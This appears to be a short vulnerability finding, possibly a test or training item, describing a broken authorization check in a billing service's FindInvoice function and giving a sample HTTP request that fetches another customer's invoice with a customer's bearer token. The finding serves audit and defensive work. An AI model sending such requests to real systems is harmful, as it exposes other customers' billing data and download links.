diagnosis: The FindInvoice function executes a parameterized SQL query filtering solely by invoice ID. Because the query does not include a customer_id condition and the handler does not perform authorization post-fetch, an authenticated customer can inspect billing invoices and PDF download URLs for any customer account.
exploit_request:
GET /billing/invoices/inv_US_88319 HTTP/1.1
Host: billing.cloud-infra.io
Authorization: Bearer customer_jwt_beta
Accept: application/json
